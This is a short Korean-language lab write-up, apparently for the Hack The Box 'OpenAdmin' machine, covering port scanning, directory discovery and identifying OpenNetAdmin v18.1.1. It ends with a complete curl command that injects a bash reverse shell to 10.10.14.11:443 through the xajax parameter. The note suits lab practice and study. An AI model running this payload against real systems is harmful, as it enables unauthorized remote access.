# OPENADMIN

Nmap

* robot.txt, index.php, index.asp등을 통해 확장자 명을 찾음 -> but 없기에 -x 옵션을 사용하지 않고 그냥 Feroxbuster 돌림
* Port : 22(ssh), 80(http)
* 80
  * 우분투 기본 홈페이지 -> feroxbuster 사용하니 SieRRA라는 페이지 발견 -> shierra는 Colorlib(WordPress 기반) 템플릿을 통해 만들어짐
    * 도메인 Chriss Turner, Julie Smart, Maria Smith, Lore Papp-Dinea
    * Owl Carousel v2.3.4
    * Opennetadmin v18.1.1
  * Opennetadmin exploit 사용(47691.sh)
    * python3 -m http.server 80
    * 쉘 획득!
    * 리버스 쉘&#x20;
      * curl -s -d "xajax=window\_submit\&xajaxr=1574117726710\&xajaxargs\[]=tooltips\&xajaxargs\[]=ip%3D%3E;bash -c 'bash -i >%26 /dev/tcp/10.10.14.11/443 0>%261'\&xajaxargs\[]=ping" http ://10.10.10.171/ona/
